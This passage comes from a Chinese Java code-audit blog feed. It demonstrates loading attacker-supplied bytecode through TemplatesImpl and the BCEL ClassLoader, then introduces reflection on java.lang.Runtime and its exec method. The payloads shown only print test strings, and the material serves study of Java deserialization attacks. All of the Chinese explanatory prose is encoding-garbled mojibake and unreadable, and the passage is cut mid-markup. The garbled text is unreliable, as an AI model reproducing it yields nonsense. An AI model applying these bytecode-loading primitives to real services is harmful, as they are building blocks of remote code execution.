string">"yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TemplatesImpl obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Reflections<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>code<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Reflections<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"HelloTemplatesImpl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Reflections<span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸€å¤§ä¸²å­—ç¬¦æ˜¯base64ç¼–ç åçš„å­—èŠ‚ç ï¼Œæ³¨æ„ï¼šå­—èŠ‚ç å¯¹åº”çš„ç±»å¿…é¡»æ˜¯ com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet çš„å­ç±»ã€‚</p><p>æ¥ç€æˆ‘ä»¬è¦é€šè¿‡setFieldValueè®¾ç½®ç§æœ‰å˜é‡ï¼Œ_bytecodesä¸ºäº¤ç»™JVMçš„å­—èŠ‚ç ï¼Œ__nameä¸ä¸ºnullå°±å¯ä»¥ï¼Œè¿™æ˜¯å› ä¸ºğŸ‘‡</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">private</span> Translet <span class="token function">getTransletInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">throws</span> TransformerConfigurationException <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>_name <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>_class <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token function">defineTransletClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true">//ç•¥</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è®¾ç½®_tfactoryæ˜¯å› ä¸ºdefineTransletClassesæ–¹æ³•è°ƒç”¨äº†TransformerFactoryImplç±»ä¸­çš„getExternalExtensionsMapæ–¹æ³•ã€‚</p><h4 id="BCEL-ClassLoaderåŠ è½½å­—èŠ‚ç "><a href="#BCEL-ClassLoaderåŠ è½½å­—èŠ‚ç " class="headerlink" title="BCEL ClassLoaderåŠ è½½å­—èŠ‚ç "></a>BCEL ClassLoaderåŠ è½½å­—èŠ‚ç </h4><p>BCELæ˜¯ä¸“é—¨ç”¨æ¥æ“æ§classå­—èŠ‚ç æ–‡ä»¶çš„ç±»ï¼Œjdk8u251åç§»é™¤äº†BCELçš„ClassLoaderç±»ï¼Œä¹‹å‰çš„ç‰ˆæœ¬å¯ä»¥åˆ©ç”¨ã€‚ Repository ç”¨äºå°†ä¸€ä¸ªJava classè½¬æ¢ä¸ºåŸç”Ÿå­—èŠ‚ç ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨javacå‘½ä»¤æ¥ç¼–è¯‘javaæ–‡ä»¶ç”Ÿæˆå­—èŠ‚ç ï¼›Utility å°†</p><p>åŸç”Ÿçš„å­—èŠ‚ç è½¬æ¢æˆBCELæ ¼å¼çš„å­—èŠ‚ç ï¼Œæ³¨æ„Utility.encodeç”Ÿæˆçš„BCELå­—èŠ‚ç è¦åŠ ä¸Š$$BCEL$$çš„å‰ç¼€ã€‚</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationTargetException<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>Repository<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>classfile<span class="token punctuation">.</span>JavaClass<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ClassLoader<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>classfile<span class="token punctuation">.</span>Utility<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloBCEL</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String <span class="token punctuation">[</span><span class="token punctuation">]</span>args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        JavaClass cls <span class="token operator">=</span> Repository<span class="token punctuation">.</span><span class="token function">lookupClass</span><span class="token punctuation">(</span>com<span class="token punctuation">.</span>Hello1<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String code <span class="token operator">=</span> Utility<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>cls<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException<span class="token punctuation">,</span> InstantiationException<span class="token punctuation">,</span> IllegalAccessException<span class="token punctuation">,</span> NoSuchMethodException<span class="token punctuation">,</span> InvocationTargetException <span class="token punctuation">{</span>        <span class="token keyword">new</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQMO$c2$40$Q$7d$x$95$d2R$BA$f0$5b$8bz$40$P$S$S$T$P$Y$3d$98$YL$88$9a$60$b8xZ$ca$G$X$fb$a1$a5$90$f0$b3$f4$a0$89$H$7f$80$3f$ca8$5bH$I$Jm2$d3$f7v$e6$cd$9b$ed$ef$df$f7$P$803$i$99$d0Q4P$c2z$K$h$s6$b1$95$c2$b6$8e$j$j$bb$M$c9$L$e9$cb$e8$92$nQ9n3h$d7AW0d$9b$d2$XwC$af$p$c2G$deq$89$c97$D$87$bbm$kJ$85$a7$a4$W$3d$cb$B$83$d5t$C$af$da$Q$ae$h$d4$ea$c4z$5c$fa$M$a5$caS$b3$cfG$bc$ear$bfWmE$a1$f4$7b$f5x$G$P$7b$d4UXp$cc$60$b6$82a$e8$88$h$a9$f4$d3$T$cdSUg$n$FC$c7$9e$85$7d$d8$e4$a7$c1$9d$X$d1$b5$3bc$bb$f56$94aT$T$3a$ca$W$Op$c8$90$b9$b5$b9g$8f$C$d9$b5$t$5e$cc$99A$86$dcl$ec$7d$a7$_$9ch$8ej$8d$H$91$f0$e8$3e$82$n$j$U$t$keP$7d$m$83$R$d9$U$dc$p$9b$85$F4$83$fe$aa$90K$D$8b$95E$bb$a3$8c$q$fd$M$f5$y$81$a9$85$u$9a$84$aeb$M$ac$9c$7c$81$7d$60$v$9f$f8$84$f6$k$97$a5$vf$90$a0$98$84F$cd$ea$k$yB$d6$a4$81$de$Me$DY$e4$a6b$e7S1C$J$z$cf$J$99$94A_Jb$sb$60$Vy$ca$b4V$5c$b9$f6$P$v$c2$l$b2$3c$C$A$A"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>output<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>$l$8b$I$A$A$A$A$A$A$AmQMO$c2$<span class="token number">40</span>$Q$<span class="token number">7d</span>$x$<span class="token number">95</span>$d2R$BA$f0$5b$8bz$<span class="token number">40</span>$P$S$S$T$P$Y<span class="token comment" spellcheck="true">//ç•¥</span>Hacked by Squirt1e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨ï¼šBCELæ ¼å¼çš„å­—èŠ‚ç å°±æ˜¯æŠŠåŸç”Ÿå­—èŠ‚ç è¿›è¡ŒHEXç¼–ç ï¼Œå†æŠŠåæ–œçº¿æ›¿æ¢æˆ$ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javaå®‰å…¨åŸºç¡€ </tag>
            
            <tag> ç±»åŠ è½½ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaä»£ç å®¡è®¡åŸºç¡€â€”åå°„</title>
      <link href="/2021/11/15/java-dai-ma-shen-ji-ji-chu-fan-she/"/>
      <url>/2021/11/15/java-dai-ma-shen-ji-ji-chu-fan-she/</url>
      
        <content type="html"><![CDATA[<blockquote><p>åå°„æ˜¯Javaçš„ä¸€ä¸ªé‡è¦ç‰¹æ€§ï¼Œé€šè¿‡åå°„å¯ä»¥è°ƒç”¨ç¨‹åºè¿è¡Œæ—¶ä»»æ„ç±»ã€å¯¹è±¡çš„æ–¹æ³•ï¼Œä¹Ÿèƒ½è®¿é—®æˆ–ä¿®æ”¹å˜é‡çš„å€¼ï¼Œå¹¶ä¸”èƒ½åˆ¤æ–­å¯¹è±¡æ‰€å±çš„ç±»ã€‚</p></blockquote><h4 id="å®ä¾‹åŒ–"><a href="#å®ä¾‹åŒ–" class="headerlink" title="å®ä¾‹åŒ–"></a>å®ä¾‹åŒ–</h4><p>å¼„æ˜ç™½åå°„è¿˜æ˜¯è¦ç¨å¾®æ·±å…¥äº†è§£å®ä¾‹åŒ–çš„è¿‡ç¨‹ï¼Œä¸‹é¢æœ‰ä¸ªæ ·ä¾‹ï¼Œå–è‡ªä»£ç å®¡è®¡æ˜Ÿçƒåå°„ç³»åˆ—ä¸‹ir0nyå¸ˆå‚…çš„è¯„è®ºã€‚</p><p>Person p &#x3D; new Person(â€œzhangsanâ€,20); å®ä¾‹åŒ–Personç±»ï¼Œè¿™å¥è¯åšäº†ä»€ä¹ˆï¼Ÿ </p><ol><li>å› ä¸ºnewç”¨åˆ°äº†Person.class.æ‰€ä»¥ä¼šå…ˆæ‰¾åˆ°Person.classæ–‡ä»¶å¹¶åŠ è½½åˆ°å†…å­˜ä¸­ã€‚</li><li>æ‰§è¡Œè¯¥ç±»ä¸­çš„staticä»£ç å—ï¼Œå¦‚æœæœ‰çš„è¯ï¼Œç»™Person.classç±»è¿›è¡Œåˆå§‹åŒ–ã€‚</li><li>åœ¨å †å†…å­˜ä¸­å¼€è¾Ÿç©ºé—´ï¼Œåˆ†é…å†…å­˜åœ°å€ã€‚</li><li>åœ¨å †å†…å­˜ä¸­å»ºç«‹å¯¹è±¡çš„ç‰¹æœ‰å±æ€§ã€‚å¹¶è¿›è¡Œé»˜è®¤åˆå§‹åŒ–ã€‚ </li><li>å¯¹å±æ€§è¿›è¡Œæ˜¾ç¤ºåˆå§‹åŒ–ã€‚</li><li>å¯¹å¯¹è±¡è¿›è¡Œæ„é€ ä»£ç å—åˆå§‹åŒ–ã€‚</li><li>å¯¹å¯¹è±¡è¿›è¡Œå¯¹åº”çš„æ„é€ å‡½æ•°åˆå§‹åŒ–ã€‚</li><li>å°†å†…å­˜åœ°å€ä»˜ç»™æ ˆå†…å­˜ä¸­çš„på˜é‡ã€‚</li></ol><p>å®ä¾‹åŒ–TrainPrintï¼Œä¸‹é¢çš„ä»£ç å°†è¾“å‡ºä»€ä¹ˆï¼ŸgetClassä»¥åŠclasså°±å…ˆç†è§£ä¸ºjavaæ–‡ä»¶ç¼–è¯‘åçš„classæ–‡ä»¶å¥½äº†ï¼Œä»£ç æ”¹è‡ªJavaå®‰å…¨æ¼«è°ˆã€‚</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TrainPrint</span> <span class="token punctuation">{</span>    <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Empty block initial %s\n"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Static initial %s\n"</span><span class="token punctuation">,</span> TrainPrint<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">fuck</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token function">TrainPrint</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Initial %s\n"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">fuck</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        TrainPrint trainPrint<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TrainPrint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>output<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>Static initial <span class="token keyword">class</span> <span class="token class-name">com<span class="token punctuation">.</span>ms08067<span class="token punctuation">.</span>TrainPrint</span>Empty block initial <span class="token keyword">class</span> <span class="token class-name">com<span class="token punctuation">.</span>ms08067<span class="token punctuation">.</span>TrainPrint</span>Initial <span class="token keyword">class</span> <span class="token class-name">com<span class="token punctuation">.</span>ms08067<span class="token punctuation">.</span>TrainPrint</span>com<span class="token punctuation">.</span>ms08067<span class="token punctuation">.</span>TrainPrint<span class="token annotation punctuation">@4b67cf4d</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°æœ€å…ˆæ‰§è¡Œçš„å°±æ˜¯é™æ€ä»£ç å—ï¼ˆæ³¨æ„è¿™é‡Œç”¨ä¸äº†thisï¼Œå› ä¸ºthisæŒ‡ä»£å½“å‰TrainPrintè¿™ä¸ªç±»çš„å¯¹è±¡ï¼Œç°åœ¨ç±»åˆšåˆšåŠ è½½ï¼Œè¿˜æ²¡æœ‰åˆ†é…å†…å­˜åœ°å€)ï¼Œéšåæ‰§è¡Œä»£ç å—ï¼Œç„¶åæ‰§è¡Œæ„é€ æ–¹æ³•ï¼Œç„¶åè°ƒç”¨fuckæ–¹æ³•è¾“å‡ºthisã€‚</p><h4 id="è·å–ç±»å¯¹è±¡"><a href="#è·å–ç±»å¯¹è±¡" class="headerlink" title="è·å–ç±»å¯¹è±¡"></a>è·å–ç±»å¯¹è±¡</h4><p>æˆ‘çš„ç†è§£ï¼šç±»å¯¹è±¡å°±æ˜¯javaæ–‡ä»¶ç¼–è¯‘åçš„classæ–‡ä»¶ï¼Œå­—èŠ‚ç å­˜æ”¾äºclassæ–‡ä»¶ä¸­ï¼Œä¹‹åäº¤ç»™JVMè¿è¡Œï¼Œå› æ­¤è·å¾—äº†å­—èŠ‚ç å°±ç­‰äºæˆ‘ä»¬è·å¾—äº†ç¨‹åºè¿è¡Œæ—¶ç±»çš„çŠ¶æ€ã€‚</p><ol><li>forName()</li></ol><pre class="line-numbers language-java"><code class="language-java">Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>forNameå®ç°äº†åŠ¨æ€åŠ è½½ç±»ï¼Œå› æ­¤è¿˜ä¼šæ‰§è¡Œé™æ€ä»£ç å—ï¼ˆç±»ä¸­staticæ®µçš„ä»£ç ï¼‰ã€‚</p><ol start="2"><li>ç±»å.class</li></ol><pre class="line-numbers language-java"><code class="language-java">Class <span class="token class-name">rt</span> <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä»…ä»…æ˜¯è·å¾—ç±»å¯¹è±¡ã€‚</p><ol start="3"><li>getClass()</li></ol><pre class="line-numbers language-java"><code class="language-java">Runtime run <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> name <span class="token operator">=</span> run<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿™ç§è¦å…ˆè·å–å®ä¾‹åŒ–å¯¹è±¡åœ¨æ‹¿åˆ°class objectã€‚</p><ol start="4"><li>getSystemClassLoader().loadClass()</li></ol><pre class="line-numbers language-java"><code class="language-java">Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> name <span class="token operator">=</span> ClassLoader<span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä»…ä»…æ˜¯è·å¾—ç±»å¯¹è±¡ã€‚</p><h4 id="è·å–ç±»æ–¹æ³•"><a href="#è·å–ç±»æ–¹æ³•" class="headerlink" title="è·å–ç±»æ–¹æ³•"></a>è·å–ç±»æ–¹æ³•</h4><ol><li>getDeclaredMethods</li></ol><p>è¿”å›ç±»æˆ–æ¥å£å£°æ˜çš„æ‰€æœ‰æ–¹æ³•ï¼ŒåŒ…æ‹¬publicã€protectedã€privateå’Œé»˜è®¤æ–¹æ³•ï¼Œä½†ä¸åŒ…æ‹¬ç»§æ‰¿çš„æ–¹æ³•ã€‚</p><pre class="line-numbers language-java"><code class="language-java">Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> a <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>Method<span class="token punctuation">[</span><span class="token punctuation">]</span> declareMethods <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>getMethods</li></ol><p>è¿”å›æŸä¸ªç±»çš„æ‰€æœ‰publicæ–¹æ³•ï¼ŒåŒ…æ‹¬å…¶ç»§æ‰¿ç±»çš„publicæ–¹æ³•ã€‚</p><pre class="line-numbers language-java"><code class="language-java">Class <span class="token class-name">a</span><span class="token operator">=</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>Method<span class="token punctuation">[</span><span class="token punctuation">]</span> methods <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">getMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="3"><li>getMethod</li></ol><p>getMethodæ–¹æ³•åªèƒ½è¿”å›ä¸€ä¸ªç‰¹å®šçš„æ–¹æ³•ã€‚æ³¨æ„ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°æ–¹æ³•çš„å‚æ•°ï¼Œå› ä¸ºexecçš„å‚æ•°æ˜¯Stringï¼Œå› æ­¤åé¢è¦è·Ÿä¸ŠString.class</p><pre class="line-numbers language-java"><code class="language-java">Runtime rt <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> name <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Method method <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="4"><li>getDeclaredMethod</li></ol><pre class="line-numbers language-java"><code class="language-java">Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> a <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>Method<span class="token punctuation">[</span><span class="token punctuation">]</span> declareMethods <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åŒä¸Šã€‚</p><h4 id="è·å–ç±»çš„æˆå‘˜å˜é‡"><a href="#è·å–ç±»çš„æˆå‘˜å˜é‡" class="headerlink" 